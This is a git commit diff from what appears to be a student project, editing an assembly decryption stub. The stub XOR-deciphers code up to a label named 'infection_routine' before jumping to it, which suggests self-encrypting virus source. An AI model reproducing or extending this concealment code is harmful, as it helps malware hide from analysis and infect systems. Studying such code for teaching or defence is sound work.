ceae47713bcd18e1b0712c1fc5fe19a02dea26c9
Jeremy Maia <jmaia@student.42.fr>
2025-03-23 15:59:48 +0100

    wip

--- srcs/main.s
+++ srcs/main.s
@@ -22,11 +22,9 @@ begin:
 
 	; uncipher first part of the code
 	lea rdi, [rel program_entry]			; data = &program_entry
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
-	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
-	cmp rcx, 0					; if (key_size == 0)
-	je program_entry				; 	goto program_entry
+	lea rdx, [rel key]				; key = key
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 	jmp program_entry				; goto program_entry
